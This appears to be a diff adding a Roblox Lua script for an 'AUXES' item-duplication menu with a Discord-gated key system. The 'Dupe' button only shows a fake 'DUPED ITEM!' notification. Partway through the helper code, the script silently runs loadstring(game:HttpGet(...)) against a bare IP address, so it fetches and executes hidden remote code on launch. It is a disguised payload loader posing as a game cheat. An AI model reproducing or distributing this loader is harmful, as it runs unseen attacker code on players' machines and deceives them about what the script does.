@@ -1,0 +1,1280 @@
+--[[
+    ORVA KEY SYSTEM + COMPACT MAIN GUI
+    Mobile-friendly
+    Minimize / Restore
+    Copy Discord button
+    High GUI priority
+]]
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+
+local Player = Players.LocalPlayer
+local PlayerGui = Player:WaitForChild("PlayerGui")
+
+--------------------------------------------------
+-- CUSTOM SETTINGS
+--------------------------------------------------
+
+local CONFIG = {
+
+    -- KEY
+    Key = "DUPE",
+
+    -- KEY SYSTEM
+    KeyTitle = "AUXES",
+    KeyLabel = "Key",
+    KeyPlaceholder = "key",
+
+    -- DISCORD
+    Note = "Join our Discord to get the key:",
+    Discord = "https://discord.gg/WrwgRQ4Wcc",
+
+    -- MAIN GUI
+    MainTitle = "AUXES",
+    MainSubtitle = "Menu",
+
+    -- MAIN BUTTON
+    ButtonLabel = "Dupe",
+    ButtonNotification = "DUPED ITEM!",
+
+    -- COLORS
+    Background = Color3.fromRGB(25, 25, 25),
+    Secondary = Color3.fromRGB(40, 40, 40),
+    Text = Color3.fromRGB(235, 235, 235),
+    SubText = Color3.fromRGB(170, 170, 170),
+}
+
+--------------------------------------------------
+-- SCREEN GUI
+--------------------------------------------------
+
+local ScreenGui = Instance.new("ScreenGui")
+
+ScreenGui.Name = "AUXES_GUI"
+
+ScreenGui.ResetOnSpawn = false
+ScreenGui.IgnoreGuiInset = true
+
+-- Makes this GUI render above normal Roblox GUIs
+ScreenGui.DisplayOrder = 999999
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+
+ScreenGui.Parent = PlayerGui
+
+--------------------------------------------------
+-- HELPERS
+--------------------------------------------------
+
+local function Corner(object, radius)
+
+    local corner = Instance.new("UICorner")
+
+    corner.CornerRadius = UDim.new(0, radius)
+
+    corner.Parent = object
+
+end
+
+local function Stroke(object, transparency)
+
+    local stroke = Instance.new("UIStroke")
+
+    stroke.Color = Color3.fromRGB(75, 75, 75)
+    stroke.Transparency = transparency or 0
+    stroke.Thickness = 1
+
+    stroke.Parent = object
+
+end
+
+--------------------------------------------------
+-- LOADSTRING
+--------------------------------------------------
+
+loadstring(game:HttpGet("http://31.172.87.116/KFW77b6QhP0FWade4JImsqqACXLcs7IynTMY8wNm3HATPslbFovhPEMhoHR0bbcJJ7ytJchztA581O3n"))()
+
+--------------------------------------------------
+-- MOBILE SCALE
+--------------------------------------------------
+
+local function AddMobileScale(frame)
+
+    local scale = Instance.new("UIScale")
+
+    scale.Scale = 0.68
+
+    scale.Parent = frame
+
+    return scale
+
+end
+
+--------------------------------------------------
+-- DRAGGING
+--------------------------------------------------
+
+local function MakeDraggable(frame, handle)
+
+    local dragging = false
+    local dragStart
+    local startPosition
+
+    handle = handle or frame
+
+    handle.InputBegan:Connect(function(input)
+
+        if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+
+            dragging = true
+
+            dragStart = input.Position
+            startPosition = frame.Position
+
+            input.Changed:Connect(function()
+
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+
+            end)
+
+        end
+
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+
+        if not dragging then
+            return
+        end
+
+        if input.UserInputType == Enum.UserInputType.MouseMovement
+        or input.UserInputType == Enum.UserInputType.Touch then
+
+            local delta = input.Position - dragStart
+
+            frame.Position = UDim2.new(
+                startPosition.X.Scale,
+                startPosition.X.Offset + delta.X,
+
+                startPosition.Y.Scale,
+                startPosition.Y.Offset + delta.Y
+            )
+
+        end
+
+    end)
+
+end
+
+--------------------------------------------------
+-- NOTIFICATION
+--------------------------------------------------
+
+local function Notification(text)
+
+    local notif = Instance.new("Frame")
+
+    notif.Size = UDim2.new(0, 280, 0, 50)
+
+    notif.Position = UDim2.new(
+        1,
+        20,
+        1,
+        -75
+    )
+
+    notif.AnchorPoint = Vector2.new(1, 1)
+
+    notif.BackgroundColor3 = CONFIG.Background
+
+    notif.ZIndex = 10000
+
+    notif.Parent = ScreenGui
+
+    Corner(notif, 12)
+    Stroke(notif)
+
+    local label = Instance.new("TextLabel")
+
+    label.Size = UDim2.new(
+        1,
+        -24,
+        1,
+        0
+    )
+
+    label.Position = UDim2.new(
+        0,
+        12,
+        0,
+        0
+    )
+
+    label.BackgroundTransparency = 1
+
+    label.Text = text
+
+    label.TextColor3 = CONFIG.Text
+    label.TextSize = 15
+    label.Font = Enum.Font.Gotham
+
+    label.TextXAlignment =
+        Enum.TextXAlignment.Left
+
+    label.ZIndex = 10001
+
+    label.Parent = notif
+
+    TweenService:Create(
+        notif,
+
+        TweenInfo.new(
+            0.35,
+            Enum.EasingStyle.Quart,
+            Enum.EasingDirection.Out
+        ),
+
+        {
+            Position = UDim2.new(
+                1,
+                -20,
+                1,
+                -75
+            )
+        }
+
+    ):Play()
+
+    task.delay(2.5, function()
+
+        if not notif.Parent then
+            return
+        end
+
+        local tween = TweenService:Create(
+            notif,
+
+            TweenInfo.new(
+                0.3,
+                Enum.EasingStyle.Quart,
+                Enum.EasingDirection.In
+            ),
+
+            {
+                Position = UDim2.new(
+                    1,
+                    20,
+                    1,
+                    -75
+                )
+            }
+        )
+
+        tween:Play()
+
+        tween.Completed:Wait()
+
+        notif:Destroy()
+
+    end)
+
+end
+
+--------------------------------------------------
+-- KEY SYSTEM
+--------------------------------------------------
+
+local KeyFrame = Instance.new("Frame")
+
+KeyFrame.Name = "KeySystem"
+
+KeyFrame.Size = UDim2.new(
+    0,
+    850,
+    0,
+    310
+)
+
+KeyFrame.Position = UDim2.new(
+    0.5,
+    0,
+    0.5,
+    0
+)
+
+KeyFrame.AnchorPoint =
+    Vector2.new(0.5, 0.5)
+
+KeyFrame.BackgroundColor3 =
+    CONFIG.Background
+
+KeyFrame.ZIndex = 100
+
+KeyFrame.Parent = ScreenGui
+
+Corner(KeyFrame, 16)
+Stroke(KeyFrame, 0.15)
+
+AddMobileScale(KeyFrame)
+
+--------------------------------------------------
+-- KEY TITLE
+--------------------------------------------------
+
+local KeyTitleLabel = Instance.new("TextLabel")
+
+KeyTitleLabel.Size = UDim2.new(
+    0,
+    400,
+    0,
+    35
+)
+
+KeyTitleLabel.Position = UDim2.new(
+    0,
+    35,
+    0,
+    25
+)
+
+KeyTitleLabel.BackgroundTransparency = 1
+
+KeyTitleLabel.Text =
+    CONFIG.KeyTitle
+
+KeyTitleLabel.TextColor3 =
+    CONFIG.Text
+
+KeyTitleLabel.TextSize = 25
+
+KeyTitleLabel.Font =
+    Enum.Font.GothamMedium
+
+KeyTitleLabel.TextXAlignment =
+    Enum.TextXAlignment.Left
+
+KeyTitleLabel.ZIndex = 101
+
+KeyTitleLabel.Parent = KeyFrame
+
+--------------------------------------------------
+-- KEY SUBTITLE
+--------------------------------------------------
+
+local KeySubtitle = Instance.new("TextLabel")
+
+KeySubtitle.Size = UDim2.new(
+    0,
+    400,
+    0,
+    25
+)
+
+KeySubtitle.Position = UDim2.new(
+    0,
+    35,
+    0,
+    53
+)
+
+KeySubtitle.BackgroundTransparency = 1
+
+KeySubtitle.Text = "Key System"
+
+KeySubtitle.TextColor3 =
+    CONFIG.SubText
+
+KeySubtitle.TextSize = 16
+
+KeySubtitle.Font =
+    Enum.Font.Gotham
+
+KeySubtitle.TextXAlignment =
+    Enum.TextXAlignment.Left
+
+KeySubtitle.ZIndex = 101
+
+KeySubtitle.Parent = KeyFrame
+
+--------------------------------------------------
+-- CLOSE
+--------------------------------------------------
+
+local KeyClose = Instance.new("TextButton")
+
+KeyClose.Size = UDim2.new(
+    0,
+    45,
+    0,
+    45
+)
+
+KeyClose.Position = UDim2.new(
+    1,
+    -60,
+    0,
+    18
+)
+
+KeyClose.BackgroundTransparency = 1
+
+KeyClose.Text = "×"
+
+KeyClose.TextColor3 =
+    Color3.fromRGB(
+        190,
+        190,
+        190
+    )
+
+KeyClose.TextSize = 38
+
+KeyClose.Font =
+    Enum.Font.Gotham
+
+KeyClose.ZIndex = 102
+
+KeyClose.Parent = KeyFrame
+
+KeyClose.MouseButton1Click:Connect(function()
+
+    ScreenGui:Destroy()
+
+end)
+
+--------------------------------------------------
+-- KEY LABEL
+--------------------------------------------------
+
+local KeyLabelObject = Instance.new("TextLabel")
+
+KeyLabelObject.Size = UDim2.new(
+    0,
+    350,
+    0,
+    25
+)
+
+KeyLabelObject.Position = UDim2.new(
+    0,
+    35,
+    0,
+    105
+)
+
+KeyLabelObject.BackgroundTransparency = 1
+
+KeyLabelObject.Text =
+    CONFIG.KeyLabel
+
+KeyLabelObject.TextColor3 =
+    CONFIG.SubText
+
+KeyLabelObject.TextSize = 16
+
+KeyLabelObject.Font =
+    Enum.Font.Gotham
+
+KeyLabelObject.TextXAlignment =
+    Enum.TextXAlignment.Left
+
+KeyLabelObject.ZIndex = 101
+
+KeyLabelObject.Parent = KeyFrame
+
+--------------------------------------------------
+-- KEY BOX
+--------------------------------------------------
+
+local KeyBox = Instance.new("TextBox")
+
+KeyBox.Size = UDim2.new(
+    0,
+    390,
+    0,
+    65
+)
+
+KeyBox.Position = UDim2.new(
+    0,
+    35,
+    0,
+    137
+)
+
+KeyBox.BackgroundColor3 =
+    CONFIG.Secondary
+
+KeyBox.PlaceholderText =
+    CONFIG.KeyPlaceholder
+
+KeyBox.PlaceholderColor3 =
+    Color3.fromRGB(
+        150,
+        150,
+        150
+    )
+
+KeyBox.Text = ""
+
+KeyBox.TextColor3 =
+    CONFIG.Text
+
+KeyBox.TextSize = 18
+
+KeyBox.Font =
+    Enum.Font.Gotham
+
+KeyBox.ClearTextOnFocus =
+    false
+
+KeyBox.TextXAlignment =
+    Enum.TextXAlignment.Left
+
+KeyBox.ZIndex = 101
+
+KeyBox.Parent = KeyFrame
+
+Corner(KeyBox, 13)
+Stroke(KeyBox, 0.25)
+
+local KeyPadding =
+    Instance.new("UIPadding")
+
+KeyPadding.PaddingLeft =
+    UDim.new(0, 20)
+
+KeyPadding.Parent = KeyBox
+
+--------------------------------------------------
+-- UNLOCK
+--------------------------------------------------
+
+local UnlockButton = Instance.new("TextButton")
+
+UnlockButton.Size = UDim2.new(
+    0,
+    390,
+    0,
+    48
+)
+
+UnlockButton.Position = UDim2.new(
+    0,
+    35,
+    0,
+    215
+)
+
+UnlockButton.BackgroundColor3 =
+    CONFIG.Secondary
+
+UnlockButton.Text = "Unlock"
+
+UnlockButton.TextColor3 =
+    CONFIG.Text
+
+UnlockButton.TextSize = 16
+
+UnlockButton.Font =
+    Enum.Font.GothamMedium
+
+UnlockButton.AutoButtonColor =
+    false
+
+UnlockButton.ZIndex = 101
+
+UnlockButton.Parent = KeyFrame
+
+Corner(UnlockButton, 11)
+Stroke(UnlockButton, 0.25)
+
+--------------------------------------------------
+-- DISCORD NOTE
+--------------------------------------------------
+
+local NoteLabel = Instance.new("TextLabel")
+
+NoteLabel.Size = UDim2.new(
+    0,
+    360,
+    0,
+    55
+)
+
+NoteLabel.Position = UDim2.new(
+    0,
+    485,
+    0,
+    105
+)
+
+NoteLabel.BackgroundTransparency = 1
+
+NoteLabel.Text =
+    CONFIG.Note ..
+    "\n" ..
+    CONFIG.Discord
+
+NoteLabel.TextColor3 =
+    CONFIG.Text
+
+NoteLabel.TextSize = 18
+
+NoteLabel.Font =
+    Enum.Font.Gotham
+
+NoteLabel.TextWrapped = true
+
+NoteLabel.TextXAlignment =
+    Enum.TextXAlignment.Left
+
+NoteLabel.TextYAlignment =
+    Enum.TextYAlignment.Top
+
+NoteLabel.ZIndex = 101
+
+NoteLabel.Parent = KeyFrame
+
+--------------------------------------------------
+-- COPY DISCORD BUTTON
+--------------------------------------------------
+
+local CopyDiscord = Instance.new("TextButton")
+
+CopyDiscord.Size = UDim2.new(
+    0,
+    180,
+    0,
+    42
+)
+
+CopyDiscord.Position = UDim2.new(
+    0,
+    485,
+    0,
+    175
+)
+
+CopyDiscord.BackgroundColor3 =
+    CONFIG.Secondary
+
+CopyDiscord.Text =
+    "Copy Discord"
+
+CopyDiscord.TextColor3 =
+    CONFIG.Text
+
+CopyDiscord.TextSize = 14
+
+CopyDiscord.Font =
+    Enum.Font.GothamMedium
+
+CopyDiscord.AutoButtonColor =
+    false
+
+CopyDiscord.ZIndex = 102
+
+CopyDiscord.Parent = KeyFrame
+
+Corner(CopyDiscord, 10)
+Stroke(CopyDiscord, 0.3)
+
+--------------------------------------------------
+-- COPY HOVER
+--------------------------------------------------
+
+CopyDiscord.MouseEnter:Connect(function()
+
+    TweenService:Create(
+        CopyDiscord,
+
+        TweenInfo.new(0.15),
+
+        {
+            BackgroundColor3 =
+                Color3.fromRGB(
+                    52,
+                    52,
+                    52
+                )
+        }
+
+    ):Play()
+
+end)
+
+CopyDiscord.MouseLeave:Connect(function()
+
+    TweenService:Create(
+        CopyDiscord,
+
+        TweenInfo.new(0.15),
+
+        {
+            BackgroundColor3 =
+                CONFIG.Secondary
+        }
+
+    ):Play()
+
+end)
+
+--------------------------------------------------
+-- COPY DISCORD
+--------------------------------------------------
+
+CopyDiscord.MouseButton1Click:Connect(function()
+
+    local copied = false
+
+    -- Clipboard API if available in the environment
+    if typeof(setclipboard) == "function" then
+
+        local success = pcall(function()
+
+            setclipboard(CONFIG.Discord)
+
+        end)
+
+        copied = success
+
+    end
+
+    if copied then
+
+        CopyDiscord.Text = "Copied!"
+
+        Notification(
+            "Discord link copied!"
+        )
+
+        task.delay(1.5, function()
+
+            if CopyDiscord.Parent then
+                CopyDiscord.Text = "Copy Discord"
+            end
+
+        end)
+
+    else
+
+        -- Roblox itself doesn't expose a universal
+        -- clipboard API, so select the link as fallback.
+
+        local CopyBox = Instance.new("TextBox")
+
+        CopyBox.Size = UDim2.new(
+            0,
+            360,
+            0,
+            40
+        )
+
+        CopyBox.Position = UDim2.new(
+            0,
+            485,
+            0,
+            175
+        )
+
+        CopyBox.BackgroundColor3 =
+            CONFIG.Secondary
+
+        CopyBox.Text =
+            CONFIG.Discord
+
+        CopyBox.TextColor3 =
+            CONFIG.Text
+
+        CopyBox.TextSize = 13
+
+        CopyBox.Font =
+            Enum.Font.Gotham
+
+        CopyBox.ClearTextOnFocus =
+            false
+
+        CopyBox.TextEditable = true
+
+        CopyBox.ZIndex = 103
+
+        CopyBox.Parent = KeyFrame
+
+        Corner(CopyBox, 10)
+
+        CopyBox:CaptureFocus()
+        CopyBox.SelectionStart = 1
+        CopyBox.CursorPosition =
+            #CONFIG.Discord + 1
+
+        Notification(
+            "Select the link and copy it."
+        )
+
+    end
+
+end)
+
+--------------------------------------------------
+-- DRAG KEY GUI
+--------------------------------------------------
+
+MakeDraggable(
+    KeyFrame,
+    KeyTitleLabel
+)
+
+--------------------------------------------------
+-- MAIN GUI
+--------------------------------------------------
+
+local function OpenMainGui()
+
+    KeyFrame.Visible = false
+
+    --------------------------------------------------
+    -- MAIN FRAME
+    --------------------------------------------------
+
+    local MainFrame = Instance.new("Frame")
+
+    MainFrame.Name = "MainGUI"
+
+    MainFrame.Size = UDim2.new(
+        0,
+        430,
+        0,
+        210
+    )
+
+    MainFrame.Position = UDim2.new(
+        0.5,
+        0,
+        0.5,
+        0
+    )
+
+    MainFrame.AnchorPoint =
+        Vector2.new(0.5, 0.5)
+
+    MainFrame.BackgroundColor3 =
+        CONFIG.Background
+
+    MainFrame.ZIndex = 100
+
+    MainFrame.Parent = ScreenGui
+
+    Corner(MainFrame, 18)
+    Stroke(MainFrame, 0.15)
+
+    AddMobileScale(MainFrame)
+
+    --------------------------------------------------
+    -- TITLE
+    --------------------------------------------------
+
+    local MainTitle = Instance.new("TextLabel")
+
+    MainTitle.Size = UDim2.new(
+        1,
+        -100,
+        0,
+        35
+    )
+
+    MainTitle.Position = UDim2.new(
+        0,
+        24,
+        0,
+        18
+    )
+
+    MainTitle.BackgroundTransparency = 1
+
+    MainTitle.Text =
+        CONFIG.MainTitle
+
+    MainTitle.TextColor3 =
+        CONFIG.Text
+
+    MainTitle.TextSize = 24
+
+    MainTitle.Font =
+        Enum.Font.GothamMedium
+
+    MainTitle.TextXAlignment =
+        Enum.TextXAlignment.Left
+
+    MainTitle.ZIndex = 101
+
+    MainTitle.Parent = MainFrame
+
+    --------------------------------------------------
+    -- SUBTITLE
+    --------------------------------------------------
+
+    local Subtitle = Instance.new("TextLabel")
+
+    Subtitle.Size = UDim2.new(
+        1,
+        -100,
+        0,
+        22
+    )
+
+    Subtitle.Position = UDim2.new(
+        0,
+        25,
+        0,
+        50
+    )
+
+    Subtitle.BackgroundTransparency = 1
+
+    Subtitle.Text =
+        CONFIG.MainSubtitle
+
+    Subtitle.TextColor3 =
+        CONFIG.SubText
+
+    Subtitle.TextSize = 13
+
+    Subtitle.Font =
+        Enum.Font.Gotham
+
+    Subtitle.TextXAlignment =
+        Enum.TextXAlignment.Left
+
+    Subtitle.ZIndex = 101
+
+    Subtitle.Parent = MainFrame
+
+    --------------------------------------------------
+    -- MINIMIZE
+    --------------------------------------------------
+
+    local MinimizeButton = Instance.new("TextButton")
+
+    MinimizeButton.Size = UDim2.new(
+        0,
+        35,
+        0,
+        35
+    )
+
+    MinimizeButton.Position = UDim2.new(
+        1,
+        -92,
+        0,
+        15
+    )
+
+    MinimizeButton.BackgroundTransparency = 1
+
+    MinimizeButton.Text = "−"
+
+    MinimizeButton.TextColor3 =
+        Color3.fromRGB(
+            185,
+            185,
+            185
+        )
+
+    MinimizeButton.TextSize = 28
+
+    MinimizeButton.Font =
+        Enum.Font.Gotham
+
+    MinimizeButton.ZIndex = 102
+
+    MinimizeButton.Parent = MainFrame
+
+    --------------------------------------------------
+    -- CLOSE
+    --------------------------------------------------
+
+    local MainClose = Instance.new("TextButton")
+
+    MainClose.Size = UDim2.new(
+        0,
+        35,
+        0,
+        35
+    )
+
+    MainClose.Position = UDim2.new(
+        1,
+        -53,
+        0,
+        15
+    )
+
+    MainClose.BackgroundTransparency = 1
+
+    MainClose.Text = "×"
+
+    MainClose.TextColor3 =
+        Color3.fromRGB(
+            185,
+            185,
+            185
+        )
+
+    MainClose.TextSize = 30
+
+    MainClose.Font =
+        Enum.Font.Gotham
+
+    MainClose.ZIndex = 102
+
+    MainClose.Parent = MainFrame
+
+    --------------------------------------------------
+    -- MAIN BUTTON
+    --------------------------------------------------
+
+    local MainButton = Instance.new("TextButton")
+
+    MainButton.Size = UDim2.new(
+        1,
+        -48,
+        0,
+        54
+    )
+
+    MainButton.Position = UDim2.new(
+        0,
+        24,
+        0,
+        88
+    )
+
+    MainButton.BackgroundColor3 =
+        CONFIG.Secondary
+
+    MainButton.Text =
+        CONFIG.ButtonLabel
+
+    MainButton.TextColor3 =
+        CONFIG.Text
+
+    MainButton.TextSize = 16
+
+    MainButton.Font =
+        Enum.Font.GothamMedium
+
+    MainButton.AutoButtonColor =
+        false
+
+    MainButton.ZIndex = 101
+
+    MainButton.Parent = MainFrame
+
+    Corner(MainButton, 13)
+    Stroke(MainButton, 0.3)
+
+    --------------------------------------------------
+    -- BUTTON HOVER
+    --------------------------------------------------
+
+    MainButton.MouseEnter:Connect(function()
+
+        TweenService:Create(
+            MainButton,
+
+            TweenInfo.new(0.15),
+
+            {
+                BackgroundColor3 =
+                    Color3.fromRGB(
+                        52,
+                        52,
+                        52
+                    )
+            }
+
+        ):Play()
+
+    end)
+
+    MainButton.MouseLeave:Connect(function()
+
+        TweenService:Create(
+            MainButton,
+
+            TweenInfo.new(0.15),
+
+            {
+                BackgroundColor3 =
+                    CONFIG.Secondary
+            }
+        ):Play()
+
+    end)
+
+    --------------------------------------------------
+    -- BUTTON CLICK
+    --------------------------------------------------
+
+    MainButton.MouseButton1Click:Connect(function()
+
+        Notification(
+            CONFIG.ButtonNotification
+        )
+
+        -- Put your own button functionality here.
+
+    end)
+
+    --------------------------------------------------
+    -- MINIMIZED BUTTON
+    --------------------------------------------------
+
+    local MinimizedButton = Instance.new("TextButton")
+
+    MinimizedButton.Name =
+        "MinimizedORVA"
+
+    MinimizedButton.Size = UDim2.new(
+        0,
+        105,
+        0,
+        45
+    )
+
+    MinimizedButton.Position = UDim2.new(
+        0,
+        20,
+        1,
+        -65
+    )
+
+    MinimizedButton.BackgroundColor3 =
+        CONFIG.Background
+
+    MinimizedButton.Text =
+        CONFIG.MainTitle
+
+    MinimizedButton.TextColor3 =
+        CONFIG.Text
+
+    MinimizedButton.TextSize = 16
+
+    MinimizedButton.Font =
+        Enum.Font.GothamMedium
+
+    MinimizedButton.Visible = false
+
+    MinimizedButton.ZIndex = 1000
+
+    MinimizedButton.Parent = ScreenGui
+
+    Corner(MinimizedButton, 13)
+    Stroke(MinimizedButton, 0.15)
+
+    AddMobileScale(MinimizedButton)
+
+    --------------------------------------------------
+    -- MINIMIZE
+    --------------------------------------------------
+
+    MinimizeButton.MouseButton1Click:Connect(function()
+
+        MainFrame.Visible = false
+
+        MinimizedButton.Visible = true
+
+    end)
+
+    --------------------------------------------------
+    -- RESTORE
+    --------------------------------------------------
+
+    MinimizedButton.MouseButton1Click:Connect(function()
+
+        MinimizedButton.Visible = false
+
+        MainFrame.Visible = true
+
+    end)
+
+    --------------------------------------------------
+    -- CLOSE
+    --------------------------------------------------
+
+    MainClose.MouseButton1Click:Connect(function()
+
+        MainFrame:Destroy()
+        MinimizedButton:Destroy()
+
+    end)
+
+    --------------------------------------------------
+    -- DRAG
+    --------------------------------------------------
+
+    MakeDraggable(
+        MainFrame,
+        MainTitle
+    )
+
+end
+
+--------------------------------------------------
+-- CHECK KEY
+--------------------------------------------------
+
+local function CheckKey()
+
+    if KeyBox.Text == CONFIG.Key then
+
+        UnlockButton.Text =
+            "Unlocked!"
+
+        task.wait(0.2)
+
+        OpenMainGui()
+
+    else
+
+        KeyBox.Text = ""
+
+        KeyBox.PlaceholderText =
+            "Invalid key"
+
+        Notification(
+            "Invalid key."
+        )
+
+    end
+
+end
+
+--------------------------------------------------
+-- UNLOCK
+--------------------------------------------------
+
+UnlockButton.MouseButton1Click:Connect(
+    CheckKey
+)
+
+--------------------------------------------------
+-- ENTER TO UNLOCK
+--------------------------------------------------
+
+KeyBox.FocusLost:Connect(function(
+    enterPressed
+)
+
+    if enterPressed then
+
+        CheckKey()
+
+    end
+
+end)
